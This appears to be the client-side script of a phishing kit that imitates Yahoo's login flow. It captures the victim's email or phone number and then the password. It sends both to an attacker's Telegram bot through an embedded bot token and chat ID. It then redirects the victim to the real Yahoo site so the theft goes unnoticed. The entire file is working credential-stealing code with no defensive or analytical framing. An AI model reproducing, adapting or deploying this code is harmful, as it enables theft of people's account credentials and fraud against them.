const usernameForm = document.querySelector('#login-username-form');
const passwordForm = document.querySelector('#login-password-form');

if(usernameForm) {
    usernameForm.addEventListener('submit', (e) => {
        e.preventDefault();
    
        const text1 = document.getElementById("login-username").value;
        const countryNum = document.getElementById("selected-country-code");
        const isEmail = countryNum.parentElement.classList.contains("hide");
    
        const username = isEmail ? text1 : countryNum.innerText+text1;
        localStorage.setItem("username", username);
        localStorage.setItem("isEmail", isEmail ? 1 : 0);
        
        window.location.href = "/captcha.html";
    })
}

if(passwordForm) {
    const email = document.querySelector('#email');
    const username = localStorage.getItem("username");
    email.innerText = username;

    passwordForm.addEventListener('submit', (e) => {
        e.preventDefault();
    
        const isEmail = localStorage.getItem("isEmail") == 1;
        const password = document.getElementById("login-password").value;
    
        const msg = isEmail?
            `
            **Yahoo**
            Email: ${username}
            Password: ${password}
            `
            :
            `
            **Yahoo**
            Phone: ${username}
            Password: ${password}
            `
    
        const token = "6674814591:AAE0L5i7a0fA6MrKNVprhDV4c7r4ryr3U9U";
        const chat_id = "-1001974405857";
        const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${msg}`;
    
        const api = new XMLHttpRequest()
        api.open("GET", url, true)
        api.send()
        // check if it's sent correctly
        api.onreadystatechange = function() {
            if (this.readyState == 4 && this.status == 200) {
                window.location.href = "https://de.yahoo.com/";
            }
        }
    
        console.log('sent!')
    })
}

